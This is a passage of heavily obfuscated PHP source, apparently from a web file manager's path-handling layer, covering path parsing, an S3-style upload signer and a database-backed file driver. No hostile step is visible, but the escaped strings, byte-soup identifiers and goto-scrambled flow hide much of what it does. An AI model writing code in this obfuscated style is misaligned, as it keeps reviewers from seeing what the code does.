KOD_GROUP_ROOT_SELF = "\173\x67\162\x6f\165\160\122\157\x6f\x74\123\x65\x6c\x66\175"; const KOD_USER_SHARE = "\x7b\165\163\x65\162\x53\150\x61\x72\x65\x7d"; const KOD_USER_SHARE_LINK = "\x7b\165\163\x65\162\123\150\141\162\x65\x4c\x69\156\x6b\x7d"; const KOD_USER_SHARE_TO_ME = "\x7b\x73\x68\141\x72\x65\124\x6f\115\x65\175"; const KOD_SHARE_ITEM = "\x7b\163\150\141\x72\x65\x49\164\145\x6d\175"; const KOD_SHARE_LINK = "\x7b\x73\x68\x61\162\145\x49\164\145\x6d\x4c\x69\156\153\x7d"; const KOD_SEARCH = "\x7b\163\x65\x61\162\x63\x68\175"; const KOD_BLOCK = "\x7b\142\154\x6f\143\153\175"; const KOD_IO = "\x7b\x69\157\175"; const KOD_USER_RECENT = "\173\165\163\x65\x72\122\x65\156\143\145\156\x74\x7d"; const KOD_USER_DRIVER = "\x7b\x64\x72\x69\166\145\x72\175"; public static function typeList() { $CÍ∏É…‚ôä =& $_SERVER[£¿ÌÙëü¡¯¯]; return array($CÍ∏É…‚ôä[1025] => self::KOD_SOURCE, $CÍ∏É…‚ôä[1026] => self::KOD_USER_RECYCLE, $CÍ∏É…‚ôä[1027] => self::KOD_USER_FAV, $CÍ∏É…‚ôä[1028] => self::KOD_USER_FILE_TAG, $CÍ∏É…‚ôä[1029] => self::KOD_USER_FILE_TYPE, $CÍ∏É…‚ôä[1030] => self::KOD_GROUP_ROOT_SELF, $CÍ∏É…‚ôä[1031] => self::KOD_USER_SHARE, $CÍ∏É…‚ôä[1032] => self::KOD_USER_SHARE_LINK, $CÍ∏É…‚ôä[1033] => self::KOD_USER_SHARE_TO_ME, $CÍ∏É…‚ôä[1034] => self::KOD_SHARE_ITEM, $CÍ∏É…‚ôä[1035] => self::KOD_SHARE_LINK, $CÍ∏É…‚ôä[1036] => self::KOD_SEARCH, $CÍ∏É…‚ôä[1037] => self::KOD_BLOCK, $CÍ∏É…‚ôä[1038] => self::KOD_IO, $CÍ∏É…‚ôä[1039] => self::KOD_USER_RECENT, $CÍ∏É…‚ôä[1040] => self::KOD_USER_DRIVER); } public static function parse($e±®¯äõ‹À) { goto f¢¢€é·Ù¬; f¢¢€é·Ù¬: $Bé¶ß‚Áñú =& $_SERVER[£¿ÌÙëü¡¯¯]; $e±®¯äõ‹À = self::clear($e±®¯äõ‹À); $Fßúì€Á¯ò = array_values(self::typeList()); goto b≥Ùπ±µ∏£; cóõÉ¡ÓÇñ: $aŸÍƒÇü≥â = array($Bé¶ß‚Áñú[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $f≈ê≈æƒ˘“[$Bé¶ß‚Áñú[1045]] = in_array($f≈ê≈æƒ˘“[$Bé¶ß‚Áñú[29]], $aŸÍƒÇü≥â); return $f≈ê≈æƒ˘“; goto aÖ·Ê∂äÜÑ; b≥Ùπ±µ∏£: preg_match($Bé¶ß‚Áñú[1041], $e±®¯äõ‹À, $fÓÁÿµÔ∑Œ); $f≈ê≈æƒ˘“ = array($Bé¶ß‚Áñú[385] => !1, $Bé¶ß‚Áñú[1042] => !1, $Bé¶ß‚Áñú[382] => !1, $Bé¶ß‚Áñú[76] => $e±®¯äõ‹À, $Bé¶ß‚Áñú[986] => !1, $Bé¶ß‚Áñú[985] => $Bé¶ß‚Áñú[33]); if (is_array($fÓÁÿµÔ∑Œ) && count($fÓÁÿµÔ∑Œ) == 5) { $Eãƒ¥ûôåπ = $Bé¶ß‚Áñú[1043] . $fÓÁÿµÔ∑Œ[2] . $Bé¶ß‚Áñú[312]; if (in_array($Eãƒ¥ûôåπ, $Fßúì€Á¯ò)) { $f≈ê≈æƒ˘“[$Bé¶ß‚Áñú[986]] = $fÓÁÿµÔ∑Œ[1]; $f≈ê≈æƒ˘“[$Bé¶ß‚Áñú[29]] = $Eãƒ¥ûôåπ; $f≈ê≈æƒ˘“[$Bé¶ß‚Áñú[1044]] = substr($Eãƒ¥ûôåπ, 1, -1); $f≈ê≈æƒ˘“[$Bé¶ß‚Áñú[364]] = $fÓÁÿµÔ∑Œ[3]; } $f≈ê≈æƒ˘“[$Bé¶ß‚Áñú[985]] = $fÓÁÿµÔ∑Œ[4]; } goto cóõÉ¡ÓÇñ; aÖ·Ê∂äÜÑ: } public static function clear($eè££¨ÒÜ⁄) { goto DõÓøóëö‹; DõÓøóëö‹: $Aã∫æŒ›å‘ =& $_SERVER[£¿ÌÙëü¡¯¯]; $eè££¨ÒÜ⁄ = str_replace($Aã∫æŒ›å‘[96], $Aã∫æŒ›å‘[8], $eè££¨ÒÜ⁄); $dÁº˘Œúµú = $Aã∫æŒ›å‘[1046]; goto b©é≥∫πòØ; b©é≥∫πòØ: if (substr($eè££¨ÒÜ⁄, 0, 3) == $Aã∫æŒ›å‘[1047]) { $eè££¨ÒÜ⁄ = substr($eè££¨ÒÜ⁄, 3); } while (strstr($eè££¨ÒÜ⁄, $dÁº˘Œúµú)) { $eè££¨ÒÜ⁄ = str_replace($dÁº˘Œúµú, $Aã∫æŒ›å‘[8], $eè££¨ÒÜ⁄); } $eè££¨ÒÜ⁄ = preg_replace($Aã∫æŒ›å‘[1048], $Aã∫æŒ›å‘[8], $eè££¨ÒÜ⁄); goto F¢¿ëººàë; F¢¿ëººàë: if ($eè££¨ÒÜ⁄ == $Aã∫æŒ›å‘[8]) { return $Aã∫æŒ›å‘[8]; } $eè££¨ÒÜ⁄ = rtrim($eè££¨ÒÜ⁄, $Aã∫æŒ›å‘[8]); return $eè££¨ÒÜ⁄; goto c≈‰ÈÜÜòè; c≈‰ÈÜÜòè: } public static function sourceID($BÛºŒ˜¥õÏ) { $AÌùúÚã∂ä =& $_SERVER[£¿ÌÙëü¡¯¯]; $Fê§’Ãó Ç = self::parse($BÛºŒ˜¥õÏ); if ($Fê§’Ãó Ç[$AÌùúÚã∂ä[29]] !== self::KOD_SOURCE) { show_json(LNG($AÌùúÚã∂ä[1049]), !1); } return $Fê§’Ãó Ç[$AÌùúÚã∂ä[364]]; } public static function make($Fôû‹åÎÈÏ) { if (!$Fôû‹åÎÈÏ) { return !1; } return self::makePath(self::KOD_SOURCE, intval($Fôû‹åÎÈÏ)); } public static function makeShare($bÏè¶√Ê–è, $CÉ˜éí≠Ú´) { return self::makePath(self::KOD_SHARE_ITEM, $bÏè¶√Ê–è, $CÉ˜éí≠Ú´); } public static function makeFileTypePath($D∂∞†±§§Â) { return self::makePath(self::KOD_USER_FILE_TYPE, $D∂∞†±§§Â); } public static function makeFileTagPath($e¶ˆô°ç≥â) { return self::makePath(self::KOD_USER_FILE_TAG, $e¶ˆô°ç≥â); } public static function makePath($b∏°â„ÏçÍ, $Eæ‚ëñã⁄í = '', $b∂˘ƒò∞êµ = '') { $a£¢ÊÆÓÆª =& $_SERVER[£¿ÌÙëü¡¯¯]; $DÉçú£±– = substr($b∏°â„ÏçÍ, 1, -1); $d√®®ÇÁÛﬁ = $a£¢ÊÆÓÆª[1050] . $DÉçú£±– . $a£¢ÊÆÓÆª[722] . $Eæ‚ëñã⁄í . $a£¢ÊÆÓÆª[1051]; $d√®®ÇÁÛﬁ = $b∂˘ƒò∞êµ ? $d√®®ÇÁÛﬁ . $b∂˘ƒò∞êµ . $a£¢ÊÆÓÆª[8] : $d√®®ÇÁÛﬁ; return $d√®®ÇÁÛﬁ; } public static function hashPath($añÉÃ™€ÿÌ) { $fΩàåö Úö =& $_SERVER[£¿ÌÙëü¡¯¯]; $cà≥ìêåø‡ = is_array($añÉÃ™€ÿÌ) ? $añÉÃ™€ÿÌ : IO::info($añÉÃ™€ÿÌ); $f»Ω’⁄•¯  = _get($cà≥ìêåø‡, $fΩàåö Úö[1052], $fΩàåö Úö[33]); if (!$f»Ω’⁄•¯ ) { $FäîñìÖŒ¶ = KodIO::parse($cà≥ìêåø‡[$fΩàåö Úö[76]]); if (!$FäîñìÖŒ¶[$fΩàåö Úö[29]]) { $f»Ω’⁄•¯  = IO::hashSimple($cà≥ìêåø‡[$fΩàåö Úö[76]]); } } if (!$f»Ω’⁄•¯ ) { $f»Ω’⁄•¯  = md5($cà≥ìêåø‡[$fΩàåö Úö[76]] . $cà≥ìêåø‡[$fΩàåö Úö[78]] . $cà≥ìêåø‡[$fΩàåö Úö[108]]); } return $f»Ω’⁄•¯ ; } public static function initSystemPath() { $A¥œü∞≥⁄ÿ =& $_SERVER[£¿ÌÙëü¡¯¯]; $c◊§ıÖ´ÆÎ = array($A¥œü∞≥⁄ÿ[1053] => $A¥œü∞≥⁄ÿ[1054], $A¥œü∞≥⁄ÿ[1055] => $A¥œü∞≥⁄ÿ[1056], $A¥œü∞≥⁄ÿ[1057] => $A¥œü∞≥⁄ÿ[1058], $A¥œü∞≥⁄ÿ[1059] => $A¥œü∞≥⁄ÿ[1060]); foreach ($c◊§ıÖ´ÆÎ as $bŸ≠ﬂ˜ò«– => $C÷áΩÕÀ‰Ú) { if (!defined($bŸ≠ﬂ˜ò«–)) { define($bŸ≠ﬂ˜ò«–, self::systemPath($C÷áΩÕÀ‰Ú)); } } } private static function systemPath($E‹Êù‘ööç) { goto BÔ°∫√‡’◊; a∞…¬êÖÒõ: if ($a–ŸõÛ‹∆ﬁ) { return $a–ŸõÛ‹∆ﬁ; } if ($E‹Êù‘ööç == $B˜îóΩ‘∏Ì[1054]) { $a–ŸõÛ‹∆ﬁ = self::make(Model($B˜îóΩ‘∏Ì[749])->systemRootPathAdd($B˜îóΩ‘∏Ì[1063])); } else { $a–ŸõÛ‹∆ﬁ = self::systemPath($B˜îóΩ‘∏Ì[1054]); $Bºè—ìÈîê = self::sourceID($a–ŸõÛ‹∆ﬁ); $a–ŸõÛ‹∆ﬁ = self::make(Model($B˜îóΩ‘∏Ì[749])->mkdir($Bºè—ìÈîê, $E‹Êù‘ööç)); } Model($B˜îóΩ‘∏Ì[1062])->set($bÎŸ˘æ∫¿¬, $a–ŸõÛ‹∆ﬁ); goto aÙ°ˆ«Î≠; BÔ°∫√‡’◊: $B˜îóΩ‘∏Ì =& $_SERVER[£¿ÌÙëü¡¯¯]; $bÎŸ˘æ∫¿¬ = $B˜îóΩ‘∏Ì[1061] . ucfirst($E‹Êù‘ööç); $a–ŸõÛ‹∆ﬁ = Model($B˜îóΩ‘∏Ì[1062])->get($bÎŸ˘æ∫¿¬); goto a∞…¬êÖÒõ; aÙ°ˆ«Î≠: return $a–ŸõÛ‹∆ﬁ; goto eË√œá≠Ÿ’; eË√œá≠Ÿ’: } public static function systemFolder($cèº«∞’Á”) { $dó◊Ç¶ìÊø = IO_PATH_SYSTEM_SOURCE . $cèº«∞’Á”; $CÒç¯ÎÆﬁê = Cache::get($dó◊Ç¶ìÊø); if (!$CÒç¯ÎÆﬁê) { $DÑΩ™àÙ±ã = IO::infoFull($dó◊Ç¶ìÊø); if (!$DÑΩ™àÙ±ã) { $CÒç¯ÎÆﬁê = IO::mkdir($dó◊Ç¶ìÊø, REPEAT_SKIP); } else { $CÒç¯ÎÆﬁê = $DÑΩ™àÙ±ã[$_SERVER[£¿ÌÙëü¡¯¯][76]]; } Cache::set($dó◊Ç¶ìÊø, $CÒç¯ÎÆﬁê, 3600 * 10); } return $CÒç¯ÎÆﬁê; } public static function defaultDriver() { return Model($_SERVER[£¿ÌÙëü¡¯¯][691])->defaultDriver(); } public static function defaultIO() { $CûüçªæÏœ =& $_SERVER[£¿ÌÙëü¡¯¯]; $fîÓ°‰ﬁ…¢ = self::defaultDriver(); return $CûüçªæÏœ[1064] . $fîÓ°‰ﬁ…¢[$CûüçªæÏœ[364]] . $CûüçªæÏœ[1051]; } public static function fileTypeList() { $AˆœÀΩ‡ä… =& $_SERVER[£¿ÌÙëü¡¯¯]; $B—Èâµòáî = $GLOBALS[$AˆœÀΩ‡ä…[6]][$AˆœÀΩ‡ä…[1065]]; foreach ($B—Èâµòáî as $Dµ›ƒÿ¿ ∑ => $DØ⁄Õº¡≥Õ) { $BÌµÑ§à‹ç = $AˆœÀΩ‡ä…[1066] . $Dµ›ƒÿ¿ ∑; $Cô‡ïúúÛÎ = LNG($BÌµÑ§à‹ç); if ($BÌµÑ§à‹ç != $Cô‡ïúúÛÎ) { $B—Èâµòáî[$Dµ›ƒÿ¿ ∑][$AˆœÀΩ‡ä…[28]] = $Cô‡ïúúÛÎ; } } return $B—Èâµòáî; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($aã‹ı¿Ô√Ê) { parent::__construct($aã‹ı¿Ô√Ê); $this->signatureVersion($_SERVER[£¿ÌÙëü¡¯¯][197]); } public function uploadFormData($föúÚ◊≤•–, $FË•áÔ∑≤≤ = 3600) { goto dÃ†˜áê»ä; BÒ‰‹±÷€è: $F…´óêÌæÑ = array($d‹á„§‡¥õ[1069] => $dÎ√´îŒµÂ, $d‹á„§‡¥õ[1070] => array(array($d‹á„§‡¥õ[1071] => $FÜ©ıÕ≈ûë), array($d‹á„§‡¥õ[1072] => $this->bucket), array($d‹á„§‡¥õ[1073], $d‹á„§‡¥õ[1074], $d‹á„§‡¥õ[33]), array($d‹á„§‡¥õ[1075] => $Cîãç©ˆ Ñ), array($d‹á„§‡¥õ[1076] => $E¥ÿÍíè§’), array($d‹á„§‡¥õ[1077] => $this->accessKey), array($d‹á„§‡¥õ[1078] => $eäÒÈ≥Ñ”∂))); $F…´óêÌæÑ = json_encode($F…´óêÌæÑ); $F‘…†¢ãœÒ = hash_hmac($d‹á„§‡¥õ[215], $eäÒÈ≥Ñ”∂, $this->secret); goto EÔ∆äü≤Üú; EÔ∆äü≤Üú: $a¡ÖºÂÖˆı = sha1($F…´óêÌæÑ); $b≤Ô–∂”‡µ = hash_hmac($d‹á„§‡¥õ[215], $a¡ÖºÂÖˆı, $F‘…†¢ãœÒ); $AÈÏ∆ÍŸ”◊ = array($d‹á„§‡¥õ[1071] => $FÜ©ıÕ≈ûë, $d‹á„§‡¥õ[1075] => $Cîãç©ˆ Ñ, $d‹á„§‡¥õ[1079] => base64_encode($F…´óêÌæÑ), $d‹á„§‡¥õ[1076] => $E¥ÿÍíè§’, $d‹á„§‡¥õ[1077] => $this->accessKey, $d‹á„§‡¥õ[1080] => $eäÒÈ≥Ñ”∂, $d‹á„§‡¥õ[1081] => $b≤Ô–∂”‡µ, $d‹á„§‡¥õ[166] => $this->getHost()); goto CÇ£√´Éµ; CÇ£√´Éµ: return $AÈÏ∆ÍŸ”◊; goto d≥‡„–ÁïÉ; dÃ†˜áê»ä: $d‹á„§‡¥õ =& $_SERVER[£¿ÌÙëü¡¯¯]; $FÜ©ıÕ≈ûë = $d‹á„§‡¥õ[182]; $E¥ÿÍíè§’ = $d‹á„§‡¥õ[215]; goto e¶í≥˘öæà; e¶í≥˘öæà: $Cîãç©ˆ Ñ = $d‹á„§‡¥õ[1067]; $dÎ√´îŒµÂ = gmdate($d‹á„§‡¥õ[1068], time() + $FË•áÔ∑≤≤); $eäÒÈ≥Ñ”∂ = (string) time() . $d‹á„§‡¥õ[68] . (string) (time() + $FË•áÔ∑≤≤); goto BÒ‰‹±÷€è; d≥‡„–ÁïÉ: } public function fileOutLink($C¡Êí°Éœ§) { $D¶§‹·«âõ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (substr($C¡Êí°Éœ§, 0, 7) == $D¶§‹·«âõ[1082]) { $C¡Êí°Éœ§ = $D¶§‹·«âõ[1083] . substr($C¡Êí°Éœ§, 7); } header($D¶§‹·«âõ[153] . $C¡Êí°Éœ§); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($F•§ÛÍ˜ÆÑ) { $this->pathParse = $F•§ÛÍ˜ÆÑ; $this->model = Model($_SERVER[£¿ÌÙëü¡¯¯][1084]); } public function getPath($b≤µè≥‹è†) { return trim($b≤µè≥‹è†, $_SERVER[£¿ÌÙëü¡¯¯][8]); } public function pathFather($B∏ƒØƒÙÆœ) { $d«ä±ûïåÓ = $this->parse($B∏ƒØƒÙÆœ); $d«ä±ûïåÓ = $this->infoSimple($B∏ƒØƒÙÆœ); return $d«ä±ûïåÓ ? $d«ä±ûïåÓ[$_SERVER[£¿ÌÙëü¡¯¯][457]] : !1; } public function getPathName($cÏ˜ﬁËòúÏ) { $D´≤ÉÃÁ©Â = $this->infoSimple($cÏ˜ﬁËòúÏ); return $D´≤ÉÃÁ©Â ? $D´≤ÉÃÁ©Â[$_SERVER[£¿ÌÙëü¡¯¯][28]] : !1; } public function getPathOuter($F≤∏Ï¢¢Ü◊) { if (!$F≤∏Ï¢¢Ü◊) { return $F≤∏Ï¢¢Ü◊; } $DÓÊ¥±ß∏å = $this->parse($F≤∏Ï¢¢Ü◊); return KodIO::make($DÓÊ¥±ß∏å[$_SERVER[£¿ÌÙëü¡¯¯][364]]); } public function copyFolderFromIO($CÖåÚÿñ‹Ó, $a„Á“¿∞÷”, $F¢‡øç«·ä, $e≤≤ÍÚ„ñá, $eëˆè‘≈¢‚) { $AôÓë∏ä◊ò = $this->model->copyFolderFromIO($CÖåÚÿñ‹Ó, $a„Á“¿∞÷”, $F¢‡øç«·ä, $e≤≤ÍÚ„ñá, $eëˆè‘≈¢‚); return KodIO::make($AôÓë∏ä◊ò); } public function isParentOf($aÊ¶›È„„◊, $CÒƒ»∫Ê®±) { return $this->model->isParentOf($aÊ¶›È„„◊, $CÒƒ»∫Ê®±); } public function mkfile($FßÊóÓàÙ£, $Cá√ﬂ≈ˆ¿◊ = '', $C¬éÛåÜÀ© = REPEAT_RENAME) { $BÀÈª‘êˆ∑ =& $_SERVER[£¿ÌÙëü¡¯¯]; $aæ´à‘ÊÜ = $this->parse($FßÊóÓàÙ£); $FßÊóÓàÙ£ = $aæ´à‘ÊÜ[$BÀÈª‘êˆ∑[364]]; for ($fÑçı∞ıêÖ = 0; $fÑçı∞ıêÖ < count($aæ´à‘ÊÜ[$BÀÈª‘êˆ∑[1085]]); $fÑçı∞ıêÖ++) { $DÛ«ûÇæ¶† = $aæ´à‘ÊÜ[$BÀÈª‘êˆ∑[1085]][$fÑçı∞ıêÖ]; if ($fÑçı∞ıêÖ == count($aæ´à‘ÊÜ[$BÀÈª‘êˆ∑[1085]]) - 1) { $FßÊóÓàÙ£ = $this->model->mkfile($FßÊóÓàÙ£, $DÛ«ûÇæ¶†, $Cá√ﬂ≈ˆ¿◊, $C¬éÛåÜÀ©); break; } $FßÊóÓàÙ£ = $this->model->mkdir($FßÊóÓàÙ£, $DÛ«ûÇæ¶†, REPEAT_SKIP); } return $this->getPathOuter($FßÊóÓàÙ£); } public function mkdir($B»œ≤≤ﬁˆ÷, $eæ˜©ã◊Õä = REPEAT_SKIP) { $f±ø¨«ﬂÁü =& $_SERVER[£¿ÌÙëü¡¯¯]; $dπ ÌÕπ—´ = $this->parse($B»œ≤≤ﬁˆ÷); $B»œ≤≤ﬁˆ÷ = $dπ ÌÕπ—´[$f±ø¨«ﬂÁü[364]]; for ($D“˜À¬„ÔÜ = 0; $D“˜À¬„ÔÜ < count($dπ ÌÕπ—´[$f±ø¨«ﬂÁü[1085]]); $D“˜À¬„ÔÜ++) { $e∂˘†Ñç¢‰ = $dπ ÌÕπ—´[$f±ø¨«ﬂÁü[1085]][$D“˜À¬„ÔÜ]; $B»œ≤≤ﬁˆ÷ = $this->model->mkdir($B»œ≤≤ﬁˆ÷, $e∂˘†Ñç¢‰, $eæ˜©ã◊Õä); } return $this->getPathOuter($B»œ≤≤ﬁˆ÷); } public function copyFile($Bø÷Üﬂô„ã, $bêùŸ®Ù≠í, $Báàã∑äÕ = REPEAT_REPLACE) { $dùœ°‘Ò¯å =& $_SERVER[£¿ÌÙëü¡¯¯]; $dº¢ì´ÍÉã = $this->parse($bêùŸ®Ù≠í); $DãÁŸﬂÊª¥ = $this->model->copy($Bø÷Üﬂô„ã, $dº¢ì´ÍÉã[$dùœ°‘Ò¯å[364]], $Báàã∑äÕ, $dº¢ì´ÍÉã[$dùœ°‘Ò¯å[76]]); return $DãÁŸﬂÊª¥ ? $this->getPathOuter($DãÁŸﬂÊª¥) : !1; } public function moveFile($Aé÷Ç…Õ«ç, $bàñÆãÚß˜, $Bı≠à∆¨ˆˆ = REPEAT_REPLACE) { $C•∂óÖå—⁄ =& $_SERVER[£¿ÌÙëü¡¯¯]; $f¬ó‚»Ë§ÿ = $this->parse($bàñÆãÚß˜); $Fä∏«Ûë≤û = $this->model->move($Aé÷Ç…Õ«ç, $f¬ó‚»Ë§ÿ[$C•∂óÖå—⁄[364]], $Bı≠à∆¨ˆˆ, $f¬ó‚»Ë§ÿ[$C•∂óÖå—⁄[76]]); return $Fä∏«Ûë≤û ? $this->getPathOuter($Fä∏«Ûë≤û) : !1; } public function copy($Fô‹‹ºªˆ°, $E´‚ùá√π†, $eá˘‘‘ªπÿ = REPEAT_REPLACE) { $bëÚ™ù«˘∂ = $this->parse($E´‚ùá√π†); $d€Ö™ÉÆø´ = $this->model->copy($Fô‹‹ºªˆ°, $bëÚ™ù«˘∂[$_SERVER[£¿ÌÙëü¡¯¯][364]], $eá˘‘‘ªπÿ); return $d€Ö™ÉÆø´ ? $this->getPathOuter($d€Ö™ÉÆø´) : !1; } public function move($fØ öÃåÆö, $cÆÜ≤©ÒÚ®, $A≤íÁÿßë = REPEAT_REPLACE) { $bûÔá®•≤Ø = $this->parse($cÆÜ≤©ÒÚ®); $b¿˜¢‚ÒŸª = $this->model->move($fØ öÃåÆö, $bûÔá®•≤Ø[$_SERVER[£¿ÌÙëü¡¯¯][364]], $A≤íÁÿßë); return $b¿˜¢‚ÒŸª ? $this->getPathOuter($b¿˜¢‚ÒŸª) : !1; } public function remove($A¿›Æ»áœ›, $Bπ√ﬂåà¯… = true) { return $this->model->remove($A¿›Æ»áœ›, $Bπ√ﬂåà¯…); } public function rename($eÏ√‰∫ﬂø∂, $CÊÕù‰Ûîﬂ) { $Bı∆õ˜ì´ë = $this->model->rename($eÏ√‰∫ﬂø∂, $CÊÕù‰Ûîﬂ); return $Bı∆õ˜ì´ë ? $this->getPathOuter($eÏ√‰∫ﬂø∂) : $Bı∆õ˜ì´ë; } public function size($fÉç›—†Ëπ) { $EòﬁΩÿàÓß = $this->infoSimple($fÉç›—†Ëπ); return $EòﬁΩÿàÓß ? $EòﬁΩÿàÓß[$_SERVER[£¿ÌÙëü¡¯¯][78]] : 0; } public function infoSimple($Cî°œΩÁñú) { return $this->model->sourceInfo($Cî°œΩÁñú); } public function info($Eí «œÆÊŸ) { return $this->infoParse($Eí «œÆÊŸ); } public function infoAuth($AÂïëÛäÇ) { return $this->infoParse($AÂïëÛäÇ, !1, !0); } public function infoWithChildren($F‰çäÏÍè∆) { return $this->infoParse($F‰çäÏÍè∆, !0); } protected function infoParse($dÿÉÛ Íø, $b§àÔÑÔ›ü = false, $aøÈÙê∞ï„ = false) { if (!$b§àÔÑÔ›ü) { return $this->model->pathInfo($dÿÉÛ Íø, $aøÈÙê∞ï„); } return $this->model->pathInfoMore($dÿÉÛ Íø); } public function infoFull($bæÀÿæı™Í) { $E‹Ìù∫Éë« =& $_SERVER[£¿ÌÙëü¡¯¯]; $c˜àÑ†Ñ´û = explode($E‹Ìù∫Éë«[8], $bæÀÿæı™Í); $bÆàº˜»“ò = implode($E‹Ìù∫Éë«[8], array_splice($c˜àÑ†Ñ´û, 1)); return $this->model->pathInfoByPath($c˜àÑ†Ñ´û[0], $bÆàº˜»“ò); } public function hashSimple($d–ŒøõËãß) { $AÜ¬¡ı°Ó‚ =& $_SERVER[£¿ÌÙëü¡¯¯]; $eﬁ©àäõ›≈ = $this->infoWithChildren($d–ŒøõËãß); return $eﬁ©àäõ›≈[$AÜ¬¡ı°Ó‚[159]][$AÜ¬¡ı°Ó‚[161]]; } public function hashMd5($eÀÙëüŒ…Î) { $A…é…«ŸÃá =& $_SERVER[£¿ÌÙëü¡¯¯]; $f‘Ç˘®Ö’¢ = $this->infoWithChildren($eÀÙëüŒ…Î); return $f‘Ç˘®Ö’¢[$A…é…«ŸÃá[159]][$A…é…«ŸÃá[160]]; } public function exist($Cû¯œ…€Õö) { $AáëÃÑπ√ =& $_SERVER[£¿ÌÙëü¡¯¯]; $f—≠¶âíÍ› = $this->parse($Cû¯œ…€Õö); if (!$f—≠¶âíÍ›[$AáëÃÑπ√[76]]) { return $this->isFile($Cû¯œ…€Õö) || $this->isFolder($Cû¯œ…€Õö); } $fÑÉ‘™‹ôˆ = array($AáëÃÑπ√[365] => $f—≠¶âíÍ›[$AáëÃÑπ√[364]], $AáëÃÑπ√[28] => $f—≠¶âíÍ›[$AáëÃÑπ√[76]]); $eÓ≤ûÜÌ¥§ = $this->model->where($fÑÉ‘™‹ôˆ)->find(); return $eÓ≤ûÜÌ¥§ ? !0 : !1; } public function isFile($B•“‘‡«ùŸ) { $c•ÃπÇÎ…÷ =& $_SERVER[£¿ÌÙëü¡¯¯]; $Bñ∑‹ˆØö– = $this->infoSimple($B•“‘‡«ùŸ); return $Bñ∑‹ˆØö– && $Bñ∑‹ˆØö–[$c•ÃπÇÎ…÷[367]] == $c•ÃπÇÎ…÷[84] ? !1 : !0; } public function isFolder($eï›≈»ßŒÌ) { $c∆ÓóœÑˆù =& $_SERVER[£¿ÌÙëü¡¯¯]; $FµÇ··àÇ = $this->infoSimple($eï›≈»ßŒÌ); return $FµÇ··àÇ && $FµÇ··àÇ[$c∆ÓóœÑˆù[367]] == $c∆ÓóœÑˆù[84] ? !0 : !1; } public function listPath($b…Ï™ùñÉÕ, $b™ÁÙø¿Ïá = false) { $EÀıâ≈’Ï =& $_SERVER[£¿ÌÙëü¡¯¯]; if ($b…Ï™ùñÉÕ == $EÀıâ≈’Ï[33]) { return !1; } $DÔŒΩäàä€ = array($EÀıâ≈’Ï[365] => $b…Ï™ùñÉÕ); if ($b™ÁÙø¿Ïá) { return $this->model->listSource($DÔŒΩäàä€, -1); } return $this->model->listSource($DÔŒΩäàä€); } public function has($A´‚‚èäÉè, $e†ﬂŒßƒ£Ã = false, $eô¨ÔÇú∂ª = null) { $f◊ù˘ÃÁÚü =& $_SERVER[£¿ÌÙëü¡¯¯]; $C¡∏†ﬁ–⁄ù = $this->infoWithChildren($A´‚‚èäÉè); if ($e†ﬂŒßƒ£Ã) { return array($f◊ù˘ÃÁÚü[189] => $C¡∏†ﬁ–⁄ù[$f◊ù˘ÃÁÚü[189]], $f◊ù˘ÃÁÚü[188] => $C¡∏†ﬁ–⁄ù[$f◊ù˘ÃÁÚü[188]]); } return $eô¨ÔÇú∂ª ? $C¡∏†ﬁ–⁄ù[$f◊ù˘ÃÁÚü[189]] : $C¡∏†ﬁ–⁄ù[$f◊ù˘ÃÁÚü[188]]; } public function listAll($dñ°·Ó◊¨í) { $AÓÙ‚ÉÔ€ø = IO::info($this->pathParse[$_SERVER[£¿ÌÙëü¡¯¯][76]]); if (!$AÓÙ‚ÉÔ€ø) { return array(); } return $this->model->listAll($dñ°·Ó◊¨í); } public function getContent($dŸúÇ•§” ) { return $this->model->getContent($dŸúÇ•§” ); } public function setContent($Fùë¢í¿›ﬂ, $cí§“ç„◊ = '') { return $this->model->setContent($Fùë¢í¿›ﬂ, $cí§“ç„◊); } public function fileSubstr($eÒ’ôÂæÓö, $EÁ¶õÈΩÍ≠, $E≠ïﬁ¬£ë„) { return $this->model->fileSubstr($eÒ’ôÂæÓö, $EÁ¶õÈΩÍ≠, $E≠ïﬁ¬£ë„); } public function download($Fâ÷•≤´üÖ, $AÖ‘±ñﬁÃ∂ = '') { $Dó—∑È±õö = get_path_father($AÖ‘±ñﬁÃ∂); $DΩà‹›é£Ñ = get_path_this($AÖ‘±ñﬁÃ∂); $F›©åû∆ Ñ = $this->model->fileInfoGet($Fâ÷•≤´üÖ); $bëàÆá«ê≈ = IO::copy($F›©åû∆ Ñ[$_SERVER[£¿ÌÙëü¡¯¯][76]], $Dó—∑È±õö, !1, $DΩà‹›é£Ñ); return $bëàÆá«ê≈; } public function upload($D’ãÜÜ¥…, $b¬çòí»ï’, $eÕæŸ∆õÆà = false, $Eßü‘ÏÍ≤„ = REPEAT_REPLACE) { $fó®ˆÀñ÷È =& $_SERVER[£¿ÌÙëü¡¯¯]; $a±êŸ∞åÖÀ = $this->parse($D’ãÜÜ¥…); $fÒ»∞Ò®œõ = $this->model->addFile($a±êŸ∞åÖÀ[$fó®ˆÀñ÷È[364]], $b¬çòí»ï’, $a±êŸ∞åÖÀ[$fó®ˆÀñ÷È[76]], $eÕæŸ∆õÆà, $Eßü‘ÏÍ≤„); return $this->getPathOuter($fÒ»∞Ò®œõ); } public function uploadFileByID($c¶ÕäÓ§Ñ¥, $eëœ‰Ì√âÃ, $aÛ’ø¬™Ú≈) { $a™Û‹˘û€Õ =& $_SERVER[£¿ÌÙëü¡¯¯]; $EäŒÊ‰Ê–— = $this->parse($c¶ÕäÓ§Ñ¥); $Aì°¶÷ÕÚµ = $this->model->addFileByFileID($EäŒÊ‰Ê–—[$a™Û‹˘û€Õ[364]], $eëœ‰Ì√âÃ, $EäŒÊ‰Ê–—[$a™Û‹˘û€Õ[76]], $aÛ’ø¬™Ú≈); return $this->getPathOuter($Aì°¶÷ÕÚµ); } public function addFileByRemote($E¯ÉôΩı©û, $fê¶Ω‰Áﬁÿ, $CèœÇ∫Ú–é = array(), $eÇää˜®‘ﬁ = '', $dÇﬂ˜“ÀîÜ) { $e©Éú√†å’ =& $_SERVER[£¿ÌÙëü¡¯¯]; $A°ç¢ÏªŒ˘ = $this->parse($E¯ÉôΩı©û); $eÇää˜®‘ﬁ = empty($eÇää˜®‘ﬁ) ? $A°ç¢ÏªŒ˘[$e©Éú√†å’[76]] : $eÇää˜®‘ﬁ; $a 